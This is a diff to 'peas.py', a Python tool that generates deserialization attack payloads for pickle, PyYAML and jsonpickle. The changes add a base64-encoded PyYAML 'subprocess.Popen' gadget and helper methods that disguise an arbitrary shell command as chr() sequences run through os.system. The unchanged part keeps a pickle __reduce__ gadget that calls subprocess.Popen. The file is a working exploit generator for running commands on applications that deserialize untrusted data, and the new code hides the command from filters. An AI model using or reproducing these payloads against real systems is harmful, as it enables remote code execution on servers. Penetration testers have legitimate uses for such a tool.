@@ -1,5 +1,6 @@
 # Python Deserialization attack payload file generator for pickle ,pyYAML and jsonpickle module by j0lt
 # Requirements : Python 3 , module jsonpickle
+# Version : 2.0
 # Usage : python peas.py
 
 import pickle
@@ -8,9 +9,10 @@ import jsonpickle
 import yaml
 import subprocess
 
+
 class Payload(object):
 
-    def __init__(self, cmd ,  location, base):
+    def __init__(self, cmd, location, base):
         self.cmd = cmd
         self.location = location
         self.base = base
@@ -22,6 +24,10 @@ class Payload(object):
 
     def ya(self):
         by = bytes(yaml.dump(Payload(tuple(self.cmd.split(" ")), self.location, self.base)), 'utf-8')
+        if "\'" in self.cmd or "\"" in self.cmd:
+            by = base64.b64decode("ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSAhIXB5dGhvbi90dXBsZSBbcHl0aG9u"
+                                  "LCAtYywiZXhlYyhfX2ltcG9ydF9fKGNocig5OCkrY2hyKDk3KStjaHIoMTE1KStjaHIoMTAxKStjaHIoNTQp"
+                                  "K2Nocig1MikpLmI2NGRlY29kZShcIg==")+self.pay(self.cmd)+base64.b64decode("XCIpKSJd")
         by = self.verifyencoding(by)
         open(self.location.__add__("_yaml"), "wb").write(by)
 
@@ -32,16 +38,26 @@ class Payload(object):
 
     def __add__(self, other):
 
-        return self+other
-    
+        return self + other
+
     def __reduce__(self):
         return subprocess.Popen, (self.cmd,)
 
     def verifyencoding(self, s):
-        if self.base :
+        if self.base:
             return base64.b64encode(s)
         else:
             return s
+
+    def pay(self, value):
+
+        return base64.b64encode(bytes('__import__(chr(111)+chr(115)).system({})'.format(self.conv(value)), 'utf-8'))
+
+    def conv(self, value):
+        a = ""
+        for i in value:
+            a+="chr("+str(ord(i))+")"+"+"
+        return a[:-1]
 
 
 if __name__ == "__main__":
@@ -51,7 +67,6 @@ if __name__ == "__main__":
     p = Payload(cmd, location, b)
     while 1:
         module = input("Select Module (Pickle, PyYAML, jsonpickle, All) :").lower()
-
 
         if module == "pickle":
             p.pick()
